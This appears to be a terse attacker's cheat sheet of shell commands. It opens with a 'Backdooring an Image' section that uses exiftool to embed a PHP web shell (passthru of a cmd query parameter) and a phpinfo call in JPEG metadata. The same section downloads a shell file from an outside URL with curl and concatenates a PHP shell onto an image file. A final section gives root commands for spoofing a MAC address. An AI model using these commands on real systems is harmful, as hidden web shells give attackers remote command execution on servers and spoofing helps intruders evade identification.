####Backdooring an Image####
exiftool -Comment="<?php passthru(\$_GET['cmd']); __halt_compiler(); ?>" /root/imagen.jpg
exiftool -DocumentName="<?php phpinfo(); __halt_compiler(); ?>" /root/imagen.jpg
curl -o hidden.txt https://url.website.com/shell.txt
cat file.jpg shell.php > compress.jpg

*************Change Mac address(privileges root)*******************
# ifconfig [interface] down
# ifconfig [interface] hw ether 00:11:22:33:44:55
# ifconfig [interface] up
**************************************************
